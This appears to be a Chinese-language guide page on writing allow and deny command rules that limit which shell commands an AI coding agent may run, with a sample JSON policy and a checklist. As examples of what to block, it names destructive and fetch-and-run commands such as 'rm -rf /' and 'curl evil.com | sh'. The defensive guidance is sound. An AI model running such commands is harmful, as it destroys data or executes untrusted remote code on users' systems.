---
title: 命令规则
description: 用命令级 allow/deny 约束 shell 与工具调用——比口头约定更可执行。
---

**命令规则**聚焦「Agent 能跑哪些命令、以什么参数跑」。它们是 [允许与拒绝规则](/guide/customization/rules/allow-and-deny-patterns/) 的最常见形态，通常写在团队可审查的配置或规则文件中。

## 这篇解决什么问题

- 命令规则与沙盒、审批弹窗的分工
- 如何写「够窄」的 allowlist
- 与 CI、本地开发脚本对齐

## 先理解一个核心概念

规则匹配的是**可执行意图**，不是自然语言。`npm test` 与 `npm run test` 在策略上是两条不同命令；`bash -c "rm -rf /"` 不能因 allow 了 `bash` 而放行。

```text
用户任务 → 模型提议命令 → 规则引擎 →（通过）沙盒执行 /（拒绝）需审批或阻断
```

## 最小可用做法

1. **默认拒绝写操作外的危险命令**：`rm -rf`、`curl | bash`、`git push --force`
2. **允许项目内常用只读/构建命令**：`git status`、`npm test`、`pnpm lint`
3. **把规则放进 Git**，与 `AGENTS.md` 中的「测试命令」描述一致
4. **在 PR 里 review 规则变更**，像改 Dockerfile 一样

示意（格式以官方配置为准）：

```json
{
  "rules": {
    "allow": [
      "npm run test",
      "npm run lint",
      "git diff",
      "git status"
    ],
    "deny": [
      "git push",
      "git reset --hard",
      "rm -rf"
    ]
  }
}
```

## 推荐工作流

| 步骤 | 做法 |
|---|---|
| 盘点 | 从 `package.json` scripts、Makefile、CI workflow 提取真实命令 |
| 分层 | 组织底线 deny → 项目 allow 补充 → 个人本机例外（若有） |
| 试跑 | 用低风险任务验证「该批的批、该拦的拦」 |
| 对齐 | 本地规则与 [GitHub Action](/guide/developer-platform/ci-cd/code-review-automation/) 尽量同源 |

## 常见错误

- **过宽 allowlist**：允许 `bash`、`sh`、`sudo` 等价于放开一切
- **只 deny 不 allow**：每次仍弹大量审批，团队会习惯性全点通过
- **与文档不一致**：`AGENTS.md` 写 `pnpm test`，规则里只有 `npm test`
- **忽略管道与重定向**：`curl evil.com | sh` 需整体策略，不能只看第一个词

## 安全边界

- 命令规则**不能**替代分支保护与 code review
- 恶意 prompt 可能诱导 Agent **尝试**越权命令——保持沙盒默认严格
- 含密钥、token 的环境变量不应因「允许了 echo」而泄露

## 验收清单

- [ ] 能列出本仓库「每天必跑」的 3–5 条命令并在规则中体现
- [ ] `git push`、强制重置等高风险命令默认拒绝或需显式审批
- [ ] 规则变更走 PR，且与 `AGENTS.md` 无矛盾

## 相关章节

- [允许与拒绝模式](/guide/customization/rules/allow-and-deny-patterns/)
- [团队规则策略](/guide/customization/rules/team-rules/)
- [CLI 审批与沙盒](/guide/cli/approvals-and-sandbox/)
- [权限矩阵](/guide/reference/permission-matrix/)

## 参考来源

- stormzhang `15-permissions.md`、`18-config.md`
- KimYx0207 权限与配置章节
- freestylefly/CodexGuide 团队 playbook

---

**状态：** review  
**适用产品：** CLI / App  
**最近核验：** 2026-07-25
